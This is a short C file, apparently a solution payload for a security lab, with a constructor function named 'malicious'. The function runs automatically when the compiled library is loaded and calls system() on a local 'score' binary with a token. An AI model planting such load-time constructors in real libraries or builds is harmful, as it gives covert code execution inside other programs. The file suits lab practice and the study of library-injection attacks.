#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 6268593c-960f-49bd-aa55-9667649ca214");
}
